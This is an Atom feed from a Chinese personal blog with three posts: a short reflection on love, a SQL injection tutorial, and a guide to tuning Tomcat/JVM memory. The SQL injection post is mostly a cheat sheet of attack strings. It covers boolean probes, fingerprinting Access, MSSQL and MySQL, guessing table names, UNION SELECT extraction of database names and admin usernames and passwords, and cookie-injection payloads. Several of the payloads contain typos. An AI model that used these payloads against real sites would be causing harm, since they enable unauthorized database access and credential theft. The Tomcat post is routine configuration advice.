<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Bug</title>
  <subtitle>好好学习，天天向上</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://burinicc.cn/"/>
  <updated>2016-12-01T10:55:17.526Z</updated>
  <id>http://burinicc.cn/</id>
  
  <author>
    <name>burini</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>爱情</title>
    <link href="http://burinicc.cn/2016/12/01/%E6%84%9F%E6%83%85%E6%80%9D%E8%80%83/"/>
    <id>http://burinicc.cn/2016/12/01/感情思考/</id>
    <published>2016-12-01T08:24:51.000Z</published>
    <updated>2016-12-01T10:55:17.526Z</updated>
    
    <content type="html"><![CDATA[<pre><code>生活并不可怕，可怕的是迷惘
</code></pre><img src="/images/avatar.png" width="480" height="720">
]]></content>
    
    <summary type="html">
    
      &lt;pre&gt;&lt;code&gt;生活并不可怕，可怕的是迷惘
&lt;/code&gt;&lt;/pre&gt;&lt;img src=&quot;/images/avatar.png&quot; width=&quot;480&quot; height=&quot;720&quot;&gt;

    
    </summary>
    
      <category term="生活" scheme="http://burinicc.cn/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="感情" scheme="http://burinicc.cn/tags/%E6%84%9F%E6%83%85/"/>
    
  </entry>
  
  <entry>
    <title>sql注入问题详解</title>
    <link href="http://burinicc.cn/2016/12/01/sql%E6%B3%A8%E5%85%A5%E9%97%AE%E9%A2%98%E8%AF%A6%E8%A7%A3/"/>
    <id>http://burinicc.cn/2016/12/01/sql注入问题详解/</id>
    <published>2016-12-01T03:23:39.000Z</published>
    <updated>2016-12-01T10:59:28.024Z</updated>
    
    <content type="html"><![CDATA[<p>SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。<br>SQL注入基础<br>1.试探 1=1，1=2</p>
<pre><code>http://example.asp?id=49
http://example.asp?id=49 and 1=1
http://example.asp?id=49 and 1=2
</code></pre><p>可以注入的表现：</p>
<pre><code>正常显示
正常显示
提示BOF或EOF
</code></pre><p>不可注入的表现：</p>
<pre><code>正常显示
程序定义的错误提示或提示类型转换时出错。
同上
</code></pre><p>2.判断数据库类型<br>加单引号</p>
<pre><code>错误提示含有JET（JET是ACCESS数据库的数据库引擎）
错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）
</code></pre><p>and user &gt; 0</p>
<p>SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。</p>
<p>ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。<br>and (select count (*) from sysobjects) &gt; 0</p>
<p>SQL SERVER显示正常。ACCESS显示出错。<br>and (select count (*) from msysobjects) &gt; 0</p>
<p>SQL SERVER显示正常。ACCESS显示没有权限。<br>3.猜表名</p>
<p>and (select count (*) from admin) &gt;= 0<br>返回正常说明admin存在<br>4.猜字段</p>
<p>and (select count (content) from admin) &gt;= 0<br>返回正常说明content字段存在</p>
<p>常用的猜字段函数<br>ACCESS: asc(字符) 返回字符的ascii<br>MSSQL: unicode(字符) 同上<br>ACCESS: char(数字) 返回ascii的字符<br>MSSQL: nchar()同上<br>ACCESS: mid(字符串,N,L) 返回字符串从N个字符起，长度为L的子字符串<br>MSSQL: substring(字符串,N,L) 同上<br>ACCESS,MSSQL: abc(数字) 返回数字的绝对值（猜汉字使用）<br>ACCESS,MSSQL: A between B and C 判断A是否在B和C之间</p>
<p>例and (select asc(mind(password,1,1))from admin) &gt; 100<br>查询admin中password字段第1个字符串的ascii是否大于100</p>
<p>例select <em> from article where articleid = ‘’ union select </em> from user where userid = 1<br>第一个select执行后返回结果title content<br>select <em> from article where articleid = ‘’<br>第二个select执行后返回结果username password<br>select </em> from user where userid = 1<br>整个select执行后返回结果username password<br>如果前面查询为真，则同时返回两次查询的内容</p>
<pre><code>判断字段个数order by
查表名and (select count (*) from admin) &gt;= 0
猜测admin表的字段个数（假如有三个字段id,user,password）union select 1,2,3,4,5,6,7,8,9,10,* from admin返回错误，union select 1,2,3,* from admin返回正常
</code></pre><p>inner join on: 指定返回两个表中匹配的行<br>select * from admin as a inner join admin as b on a.id = b.id返回一个表中的两个内容</p>
<p>上方3中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id</p>
<p>select * from admin inner join admin1 on admin.id = admin1.id返回两个表内容<br>MSSQL</p>
<pre><code>判断字段个数order by 13
判断字段回显位and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13
数据库版本and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13
当前数据库名and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13
所有数据库名（通过更改dbid，7以上的是用户数据库）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --
表名（更改top后的数字来查询）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--
字段对应idand 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--
根据id查字段名and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--
</code></pre><p>ASSESS<br><a id="more"></a><br>    试探1=1 1=2<br>    环境监测and ord(mid(version(),1,1))&gt;51正常则为mysql4以上版本，可以union查询union select 1,version(),3<br>    确定字段数order by 13<br>    判断精确字段and 1=2 union select 1,2,3,4正常返回在页面中<br>    爆数据库名and 1=2 union select 1,user(),3,database()正常返回在页面中<br>    爆表and 1=2 union select 1,TABLE_NAME,3,4 from information_schema.tables where TABLE_SCHEMA = ‘blah’结果返回在2字段<br>    爆字段and 1=2 union select 1,COLUMN_NAME,3,4 from informations_chema.COLUMN where TABLE_NAME=’users’ and 1=2 union select char(mid(COLUMN-NAME)),2,3,4 from information_schema.COLUMN where TABLE_NAME=’users’<br>    爆数据and 1=2 union select 1,user,3,password form phptest.users</p>
<p>cookie注入</p>
<pre><code>在原地址加单引号
去掉id值，页面出错，构造cookie语句：javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 and 1=1&quot;))会弹窗
关闭弹窗，去掉id访问，页面正常
猜测字段javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 order by 5&quot;))点击确认，去掉id访问，页面正常则正常
判断回显位javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,2,3,4 from admin&quot;))点击确认，去掉id访问，页面正常则正常
猜解user password字段javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;30 union select 1,user,3,4 from admin&quot;))
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SQL注入即是指攻击者通过在应用程序中预先定义好的查询语句结尾加上额外的SQL语句元素，欺骗数据库服务器执行非授权的任意查询。&lt;br&gt;SQL注入基础&lt;br&gt;1.试探 1=1，1=2&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://example.asp?id=49
http://example.asp?id=49 and 1=1
http://example.asp?id=49 and 1=2
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以注入的表现：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;正常显示
正常显示
提示BOF或EOF
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;不可注入的表现：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;正常显示
程序定义的错误提示或提示类型转换时出错。
同上
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2.判断数据库类型&lt;br&gt;加单引号&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;错误提示含有JET（JET是ACCESS数据库的数据库引擎）
错误提示中含有OLEDB（OLEDB是SQL SERVER使用的数据库引擎）
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;and user &amp;gt; 0&lt;/p&gt;
&lt;p&gt;SQL SERVER出错：将nvarchar值“abc”转换数据类型为int的列时发生语法错误；“abc”正是变量user的值。SQL SERVER中有一个内置变量user，变量类型为nvarchar。&lt;/p&gt;
&lt;p&gt;ACCESS的系统表[msysobjects]在web环境下读该表会提示“没有权限”；SQL SERVER的系统表[sysobjects]在web环境下不可正常读取。&lt;br&gt;and (select count (*) from sysobjects) &amp;gt; 0&lt;/p&gt;
&lt;p&gt;SQL SERVER显示正常。ACCESS显示出错。&lt;br&gt;and (select count (*) from msysobjects) &amp;gt; 0&lt;/p&gt;
&lt;p&gt;SQL SERVER显示正常。ACCESS显示没有权限。&lt;br&gt;3.猜表名&lt;/p&gt;
&lt;p&gt;and (select count (*) from admin) &amp;gt;= 0&lt;br&gt;返回正常说明admin存在&lt;br&gt;4.猜字段&lt;/p&gt;
&lt;p&gt;and (select count (content) from admin) &amp;gt;= 0&lt;br&gt;返回正常说明content字段存在&lt;/p&gt;
&lt;p&gt;常用的猜字段函数&lt;br&gt;ACCESS: asc(字符) 返回字符的ascii&lt;br&gt;MSSQL: unicode(字符) 同上&lt;br&gt;ACCESS: char(数字) 返回ascii的字符&lt;br&gt;MSSQL: nchar()同上&lt;br&gt;ACCESS: mid(字符串,N,L) 返回字符串从N个字符起，长度为L的子字符串&lt;br&gt;MSSQL: substring(字符串,N,L) 同上&lt;br&gt;ACCESS,MSSQL: abc(数字) 返回数字的绝对值（猜汉字使用）&lt;br&gt;ACCESS,MSSQL: A between B and C 判断A是否在B和C之间&lt;/p&gt;
&lt;p&gt;例and (select asc(mind(password,1,1))from admin) &amp;gt; 100&lt;br&gt;查询admin中password字段第1个字符串的ascii是否大于100&lt;/p&gt;
&lt;p&gt;例select &lt;em&gt; from article where articleid = ‘’ union select &lt;/em&gt; from user where userid = 1&lt;br&gt;第一个select执行后返回结果title content&lt;br&gt;select &lt;em&gt; from article where articleid = ‘’&lt;br&gt;第二个select执行后返回结果username password&lt;br&gt;select &lt;/em&gt; from user where userid = 1&lt;br&gt;整个select执行后返回结果username password&lt;br&gt;如果前面查询为真，则同时返回两次查询的内容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;判断字段个数order by
查表名and (select count (*) from admin) &amp;gt;= 0
猜测admin表的字段个数（假如有三个字段id,user,password）union select 1,2,3,4,5,6,7,8,9,10,* from admin返回错误，union select 1,2,3,* from admin返回正常
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;inner join on: 指定返回两个表中匹配的行&lt;br&gt;select * from admin as a inner join admin as b on a.id = b.id返回一个表中的两个内容&lt;/p&gt;
&lt;p&gt;上方3中没法显示admin中所有的字段信息，扩大显示范围，构造如下语句and 1=2 union select 1,2,3,* from admin as a inner join admin as b on a.id = b.id&lt;/p&gt;
&lt;p&gt;select * from admin inner join admin1 on admin.id = admin1.id返回两个表内容&lt;br&gt;MSSQL&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;判断字段个数order by 13
判断字段回显位and 1=2 union all select 1,2,null,4,5,6,7,8,9,10,11,null,13
数据库版本and 1=2 union select 1,@@version,null,4,5,6,7,8,9,10,11,null,13
当前数据库名and 1=2 union all select 1,db_name(),null,4,5,6,7,8,9,10,11,null,13
所有数据库名（通过更改dbid，7以上的是用户数据库）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from master.db0.sysdatabases where dbid = 7 --
表名（更改top后的数字来查询）and 1=2 union all select 1,name,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAER(85) and name not in (select top 1 name from data.db0.sysobjects where xtype = CHAR(85))--
字段对应idand 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.sysobjects where xtype = CHAR(85) and name not in (select top 7 name from data.bd0.sysobjects where xtype = CHAR(85))--
根据id查字段名and 1=2 union all select 1,id,null,4,5,6,7,8,9,10,11,null,13 from data.db0.syscolumns where ID = 12345 and name not in (select top 1 name from data.db0.syscolumns where ID = 12345)--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ASSESS&lt;br&gt;
    
    </summary>
    
      <category term="技术" scheme="http://burinicc.cn/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="SQL注入" scheme="http://burinicc.cn/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>tomcat 内存溢出三种解决方式</title>
    <link href="http://burinicc.cn/2016/12/01/tomcat-%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E4%B8%89%E7%A7%8D%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/"/>
    <id>http://burinicc.cn/2016/12/01/tomcat-内存溢出三种解决方式/</id>
    <published>2016-12-01T03:04:33.000Z</published>
    <updated>2016-12-01T09:58:05.765Z</updated>
    
    <content type="html"><![CDATA[<p>Tomcat内存溢出的原因<br>　　在生产环境中tomcat内存设置不好很容易出现内存溢出。造成内存溢出是不一样的，当然处理方式也不一样。<br>　　这里根据平时遇到的情况和相关资料进行一个总结。常见的一般会有下面三种情况：<br>　　1.OutOfMemoryError： Java heap space<br>　　2.OutOfMemoryError： PermGen space<br>　　3.OutOfMemoryError： unable to create new native thread.<br>　　Tomcat内存溢出解决方案<br>　　对于前两种情况，在应用本身没有内存泄露的情况下可以用设置tomcat jvm参数来解决。（-Xms -Xmx -XX：PermSize -XX：MaxPermSize）<br>　　最后一种可能需要调整操作系统和tomcat jvm参数同时调整才能达到目的。<br>　　第一种：是堆溢出。<br>　　原因分析：<br>JVM堆的设置是指java程序运行过程中JVM可以调配使用的内存空间的设置.JVM在启动的时候会自动设置Heap size的值，其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可进行设置。Heap size 的大小是Young Generation 和Tenured Generaion 之和。<br>在JVM中如果98％的时间是用于GC且可用的Heap size 不足2％的时候将抛出此异常信息。<br>Heap Size 最大不要超过可用物理内存的80％，一般的要将-Xms和-Xmx选项设置为相同，而-Xmn为1/4的-Xmx值。<br>　　没有内存泄露的情况下，调整-Xms -Xmx参数可以解决。<br>　　-Xms：初始堆大小<br>　　-Xmx：最大堆大小<br>　　但堆的大小受下面三方面影响：<br>　　1.相关操作系统的数据模型（32-bt还是64-bit）限制；（32位系统下，一般限制在1.5G~2G；我在2003 server 系统下（物理内存：4G和6G，jdk：1.6）测试 1612M，64位操作系统对内存无限制。）<br>　　2.系统的可用虚拟内存限制；<br>　　3.系统的可用物理内存限制。<br>　　堆的大小可以使用 java -Xmx<em>*</em>M version 命令来测试。支持的话会出现jdk的版本号，不支持会报错。<br>　　-Xms -Xmx一般配置成一样比较好比如set JAVA_OPTS= -Xms1024m -Xmx1024m<br>其初始空间(即-Xms)是物理内存的1/64，最大空间(-Xmx)是物理内存的1/4。可以利用JVM提供的-Xmn -Xms -Xmx等选项可<br>进行设置<br>实例，以下给出1G内存环境下java jvm 的参数设置参考：<br>JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true “<br>JAVA_OPTS=”-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m -XX:<br>NewSize=192m -XX:MaxNewSize=384m”<br>CATALINA_OPTS=”-server -Xms768m -Xmx768m -XX:PermSize=128m -XX:MaxPermSize=256m<br>-XX:NewSize=192m -XX:MaxNewSize=384m”<br>服务器为1G内存：JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:PermSize=64M -XX:MaxNewSize=256m -XX:MaxPermSize=128m -Djava.awt.headless=true “<br>服务器为64位、2G内存: JAVA_OPTS=’-server -Xms1024m -Xmx1536m -XX:PermSize=128M -XX:MaxNewSize=256m -XX:MaxPermSize=256m’<br>——————-解决方案1：—————————–<br>前提：是执行startup.bat启动tomcat的方式<br>Linux服务器：<br>在/usr/local/apache-tomcat-5.5.23/bin 目录下的catalina.sh<br>添加：JAVA_OPTS=’-Xms512m -Xmx1024m’<br>或者 JAVA_OPTS=”-server -Xms800m -Xmx800m -XX:MaxNewSize=256m”<br>或者 CATALINA_OPTS=”-server -Xms256m -Xmx300m”<br>Windows服务器：<br>在catalina.bat最前面加入<br>set JAVA_OPTS=-Xms128m -Xmx350m<br>或者set CATALINA_OPTS=-Xmx300M -Xms256M<br>（区别是一个直接设置jvm内存，另一个设置tomcat内存，CATALINA_OPTS似乎可以与JAVA_OPTS不加区别的使用）<br>基本参数说明<br>-client，-server<br>这两个参数用于设置虚拟机使用何种运行模式，一定要作为第一个参数，client模式启动比较快，但运行时性能和内存管理效率不如server模式，通常用于客户端应用程序。相反，server模式启动比client慢，但可获得更高的运行性能。<br>在windows上，缺省的虚拟机类型为client模式，如果要使用server模式，就需要在启动虚拟机时加-server参数，以获得更高性能，对服务器端应用，推荐采用server模式，尤其是多个CPU的系统。在Linux，Solaris上缺省采用server模式。<br>此外，在多cup下，建议用server模式<br>-Xms<size><br>设置虚拟机可用内存堆的初始大小，缺省单位为字节，该大小为1024的整数倍并且要大于1MB，可用k(K)或m(M)为单位来设置较大的内存数。初始堆大小为2MB。加“m”说明是MB，否则就是KB了。<br>例如：-Xms6400K，-Xms256M<br>-Xmx<size><br>设置虚拟机的最大可用大小，缺省单位为字节。该值必须为1024整数倍，并且要大于2MB。可用k(K)或m(M)为单位来设置较大的内存数。缺省堆最大值为64MB。<br>例如：-Xmx81920K，-Xmx80M<br>当应用程序申请了大内存运行时虚拟机抛出java.lang.OutOfMemoryError: Java heap space错误，就需要使用-Xmx设置较大的可用内存堆。<br>PermSize/MaxPermSize：定义Perm段的尺寸，即永久保存区域的大小，PermSize为JVM启动时初始化Perm的内存大小；MaxPermSize为最大可占用的Perm内存大小。在用户生产环境上一般将这两个值设为相同，以减少运行期间系统在内存申请上所花的开销。<br>如果用startup.bat启动tomcat,OK设置生效.够成功的分配200M内存.<br>——————-解决方案2：————————<br>前提：是执行startup.bat启动tomcat的方式<br>手动设置Heap size<br>Windows服务器：<br>修改TOMCAT_HOME/bin/catalina.bat，在“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>Java代码<br>set JAVA_OPTS=%JAVA_OPTS% -server -Xms800m -Xmx800m -XX:MaxNewSize=256m<br><a id="more"></a><br>注：JAVA_OPTS是保留先前设置。<br>Linux服务器：<br>修改TOMCAT_HOME/bin/catalina.sh<br>在“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>JAVA_OPTS=”$JAVA_OPTS -server -Xms800m -Xmx800m -XX:MaxNewSize=256m”<br>注：$JAVA_OPTS是保留先前设置。<br>——————-解决方案3：—————————–<br>前提：是执行windows的系统服务启动tomcat的方式<br>但是如果不是执行startup.bat启动tomcat而是利用windows的系统服务启动tomcat服务,上面的设置就不生效了,<br>就是说set JAVA_OPTS=-Xms128m -Xmx350m 没起作用.上面分配200M内存就OOM了..<br>windows服务执行的是bin\tomcat.exe.他读取注册表中的值,而不是catalina.bat的设置.<br>解决办法:<br>修改注册表HKEY_LOCAL_MACHINE\SOFTWARE\Apache Software Foundation\Tomcat Service Manager\Tomcat5\Parameters\JavaOptions<br>原值为<br>-Dcatalina.home=”C:\ApacheGroup\Tomcat 5.0”<br>-Djava.endorsed.dirs=”C:\ApacheGroup\Tomcat 5.0\common\endorsed”<br>-Xrs<br>加入 -Xms300m -Xmx350m<br>重起tomcat服务,设置生效<br>——————-解决方案4：—————————–<br>前提：是执行windows的系统服务启动tomcat的方式<br>在安装tomcat时若有勾选”NT Service(NT/2000/XP only)”<br>则安装完成后在安装目录的”bin”目录里会有一个tomcat.exe的档案<br>先把tomcat的服务停掉<br>在命令列模式下（运行里输入CMD）<br>将目录切换到tomcat的bin目录<br>用下面的命令把服务移除</size></size></p>
<p>tomcat -uninstall “Apache Tomcat 4.1”</p>
<p>接下来，写个批处理。<br>内容如下<br>set SERVICENAME=Apache Tomcat 4.1<br>set CATALINA_HOME=E:\Tomcat 4.1.24<br>set CLASSPATH=D:\j2sdk1.4.1_01\lib<br>set JAVACLASSPATH=%CLASSPATH%<br>set JAVACLASSPATH=%JAVACLASSPATH%;�TALINA_HOME%\bin\bootstrap.jar<br>set JAVACLASSPATH=%JAVACLASSPATH%;�TALINA_HOME%\common\lib\servlet.jar<br>set JAVACLASSPATH=%JAVACLASSPATH%;%JAVA_HOME%\lib\tools.jar<br>tomcat.exe -install “%SERVICENAME%” “%JAVA_HOME%\jre\bin\server\jvm.dll” -Djava.class.path=”%JAVACLASSPATH%” -Dcatalina.home=”�TALINA_HOME%” -Xms512m -Xmx768m -start org.apache.catalina.startup.Bootstrap -params start -stop org.apache.catalina.startup.Bootstrap -params stop -out “�TALINA_HOME%\logs\stdout.log” -err “�TALINA_HOME%\logs\stderr.log”</p>
<p>注意，从 tomcat.exe -install开始的是最后一行！不要手工回车换行把这一行分成了好几段。保存后在命令行下执行这个bat文件，注意执行的时候将“服务”窗口关闭。<br>第二种：永久保存区域溢出<br>　原因分析：<br>PermGen space的全称是Permanent Generation space,是指内存的永久保存区域，这块内存主要是被JVM存放Class和Meta信息的,Class在被Loader时就会被放到PermGen space中，它和存放类实例(Instance)的Heap区域不同,GC(Garbage Collection)不会在主程序运行期对PermGen space进行清理，所以如果你的应用中有很CLASS的话,就很可能出现PermGen space错误，这种错误常见在web服务器对JSP进行pre compile的时候。如果你的WEB APP下都用了大量的第三方jar, 其大小超过了jvm默认的大小(4M)那么就会产生此错误信息了。但目前的hibernate和spring项目中也很容易出现这样的问题。可能是由于这些框架会动态class，而且jvm的gc是不会清理PemGen space的，超过了jvm默认的大小(4M)，导致内存溢出。<br>　　建议：将相同的第三方jar文件移置到tomcat/shared/lib目录下，这样可以达到减少jar 文档重复占用内存的目的。<br>这一个一般是加大-XX：PermSize -XX：MaxPermSize 来解决问题。<br>　　-XX：PermSize 永久保存区域初始大小<br>　　-XX：PermSize 永久保存区域初始最大值<br>　　这一般结合第一条使用，比如 set JAVA_OPTS= -Xms1024m -Xmx1024m -XX：PermSize=128M -XX：PermSize=256M<br>　　有一点需要注意：java -Xmx<em>*</em>M version 命令来测试的最大堆内存是 -Xmx与 -XX：PermSize的和比如系统支持最大的jvm堆大小事1.5G，那 -Xmx1024m -XX：PermSize=768M 是无法运行的。<br>—————–解决方案1：————————-<br>Linux服务器：<br>在catalina.sh的第一行增加：<br>JAVA_OPTS=<br>-Xms64m<br>-Xmx256m<br>-XX:PermSize=128M<br>-XX:MaxNewSize=256m<br>-XX:MaxPermSize=256m<br>或者<br>在“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>JAVA_OPTS=”-server -XX:PermSize=64M -XX:MaxPermSize=128m<br>Windows服务器：<br>在catalina.bat的第一行增加：<br>set JAVA_OPTS=-Xms64m -Xmx256m -XX:PermSize=128M -XX:MaxNewSize=256m -XX:MaxPermSize=256m<br>—————–解决方案2：————————<br>修改TOMCAT_HOME/bin/catalina.bat（Linux下为catalina.sh），在Java代码<br>“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>set JAVA_OPTS=%JAVA_OPTS% -server -XX:PermSize=128M -XX:MaxPermSize=512m<br>“echo “Using CATALINA_BASE: $CATALINA_BASE””上面加入以下行：<br>set JAVA_OPTS=%JAVA_OPTS% -server -XX:PermSize=128M -XX:MaxPermSize=512m<br>catalina.sh下为：<br>Java代码<br>JAVA_OPTS=”$JAVA_OPTS -server -XX:PermSize=128M -XX:MaxPermSize=512m”<br>JAVA_OPTS=”$JAVA_OPTS -server -XX:PermSize=128M -XX:MaxPermSize=512m”<br>　　第三种：无法创建新的线程。<br>　　这种现象比较少见，也比较奇怪，主要是和jvm与系统内存的比例有关。<br>　　这种怪事是因为JVM已经被系统分配了大量的内存（比如1.5G），并且它至少要占用可用内存的一半。有人发现，在线程个数很多的情况下，你分配给JVM的内存越多，那么，上述错误发生的可能性就越大。<br>　　原因分析<br>（从这个blog中了解到原因：<a href="http://hi.baidu.com/hexiong/blog/item/16dc9e518fb10c2542a75b3c.html）：" target="_blank" rel="external">http://hi.baidu.com/hexiong/blog/item/16dc9e518fb10c2542a75b3c.html）：</a><br>　　每一个32位的进程最多可以使用2G的可用内存，因为另外2G被操作系统保留。这里假设使用1.5G给JVM，那么还余下500M可用内存。这500M内存中的一部分必须用于系统dll的加载，那么真正剩下的也许只有400M，现在关键的地方出现了：当你使用Java创建一个线程，在JVM的内存里也会创建一个Thread对象，但是同时也会在操作系统里创建一个真正的物理线程（参考JVM规范），操作系统会在余下的 400兆内存里创建这个物理线程，而不是在JVM的1500M的内存堆里创建。在jdk1.4里头，默认的栈大小是256KB，但是在jdk1.5里头，默认的栈大小为1M每线程，因此，在余下400M的可用内存里边我们最多也只能创建400个可用线程。<br>　　这样结论就出来了，要想创建更多的线程，你必须减少分配给JVM的最大内存。还有一种做法是让JVM宿主在你的JNI代码里边。<br>　　给出一个有关能够创建线程的最大个数的估算公式：<br>　　（MaxProcessMemory - JVMMemory - ReservedOsMemory） / （ThreadStackSize）= Number of threads<br>　　对于jdk1.5而言，假设操作系统保留120M内存：<br>　　1.5GB JVM：（2GB-1.5Gb-120MB）/（1MB） = ~380 threads<br>　　1.0GB JVM：（2GB-1.0Gb-120MB）/（1MB） = ~880 threads<br>　　在2000/XP/2003的boot.ini里头有一个启动选项，好像是：/PAE /3G ，可以让用户进程最大内存扩充至3G，这时操作系统只能占用最多1G的虚存。那样应该可以让JVM创建更多的线程。<br>　　因此这种情况需要结合操作系统进行相关调整。<br>　　因此：我们需要结合不同情况对tomcat内存分配进行不同的诊断才能从根本上解决问题。</p>
<p>检测当前JVM内存使用情况：<br>System.out.println(“JVM MAX MEMORY: “ + Runtime.getRuntime().maxMemory()/1024/1024+”M”);<br>System.out.println(“JVM IS USING MEMORY:” + Runtime.getRuntime().totalMemory()/1024/1024+”M”);<br>System.out.println(“JVM IS FREE MEMORY:” + Runtime.getRuntime().freeMemory()/1024/1024+”M”);<br>这三个方法都是说JVM的内存使用情况而不是操作系统的内存；<br>　　maxMemory()这个方法返回的是java虚拟机（这个进程）能构从操作系统那里挖到的最大的内存，以字节为单位，如果在运行java程序的时候，没有添加-Xmx参数，那么就是64兆，也就是说maxMemory()返回的大约是64<em>1024</em>1024字节，这是java虚拟机默认情况下能从操作系统那里挖到的最大的内存。如果添加了-Xmx参数，将以这个参数后面的值为准，例如java -cp ClassPath -Xmx512m ClassName，那么最大内存就是512<em>1024</em>0124字节。</p>
<p>　　totalMemory()这个方法返回的是java虚拟机现在已经从操作系统那里挖过来的内存大小，也就是java虚拟机这个进程当时所占用的所有内存。如果在运行java的时候没有添加-Xms参数，那么，在java程序运行的过程的，内存总是慢慢的从操作系统那里挖的，基本上是用多少挖多少，直挖到maxMemory()为止，所以totalMemory()是慢慢增大的。如果用了-Xms参数，程序在启动的时候就会无条件的从操作系统中挖-Xms后面定义的内存数，然后在这些内存用的差不多的时候，再去挖。<br><!--more--><br>　　freeMemory()是什么呢，刚才讲到如果在运行java的时候没有添加-Xms参数，那么，在java程序运行的过程的，内存总是慢慢的从操作系统那里挖的，基本上是用多少挖多少，但是java虚拟机100％的情况下是会稍微多挖一点的，这些挖过来而又没有用上的内存，实际上就是freeMemory()，所以freeMemory()的值一般情况下都是很小的，但是如果你在运行java程序的时候使用了-Xms，这个时候因为程序在启动的时候就会无条件的从操作系统中挖-Xms后面定义的内存数，这个时候，挖过来的内存可能大部分没用上，所以这个时候freeMemory()可能会有些<br>——————–解决方案————————–<br>JVM堆大小的调整<br>　　Sun HotSpot 1.4.1使用分代收集器，它把堆分为三个主要的域：新域、旧域以及永久域。Jvm生成的所有新对象放在新域中。一旦对象经历了一定数量的垃圾收集循环后，便获得使用期并进入旧域。在永久域中jvm则存储class和method对象。就配置而言，永久域是一个独立域并且不认为是堆的一部分。<br>　　下面介绍如何控制这些域的大小。可使用-Xms和-Xmx 控制整个堆的原始大小或最大值。<br>　　下面的命令是把初始大小设置为128M：<br>　　java –Xms128m<br>　　–Xmx256m为控制新域的大小，可使用-XX:NewRatio设置新域在堆中所占的比例。<br>　　下面的命令把整个堆设置成128m，新域比率设置成3，即新域与旧域比例为1：3，新域为堆的1/4或32M：<br>java –Xms128m –Xmx128m<br>–XX:NewRatio =3可使用-XX:NewSize和-XX:MaxNewsize设置新域的初始值和最大值。<br>　　下面的命令把新域的初始值和最大值设置成64m:<br>java –Xms256m –Xmx256m –Xmn64m<br>　　永久域默认大小为4m。运行程序时，jvm会调整永久域的大小以满足需要。每次调整时，jvm会对堆进行一次完全的垃圾收集。<br>　　使用-XX:MaxPerSize标志来增加永久域搭大小。在WebLogic Server应用程序加载较多类时，经常需要增加永久域的最大值。当jvm加载类时，永久域中的对象急剧增加，从而使jvm不断调整永久域大小。为了避免调整，可使用-XX:PerSize标志设置初始值。<br>　　下面把永久域初始值设置成32m，最大值设置成64m。<br>java -Xms512m -Xmx512m -Xmn128m -XX:PermSize=32m -XX:MaxPermSize=64m<br>　　默认状态下，HotSpot在新域中使用复制收集器。该域一般分为三个部分。第一部分为Eden，用于生成新的对象。另两部分称为救助空间，当Eden充满时，收集器停止应用程序，把所有可到达对象复制到当前的from救助空间，一旦当前的from救助空间充满，收集器则把可到达对象复制到当前的to救助空间。From和to救助空间互换角色。维持活动的对象将在救助空间不断复制，直到它们获得使用期并转入旧域。使用-XX:SurvivorRatio可控制新域子空间的大小。<br>　　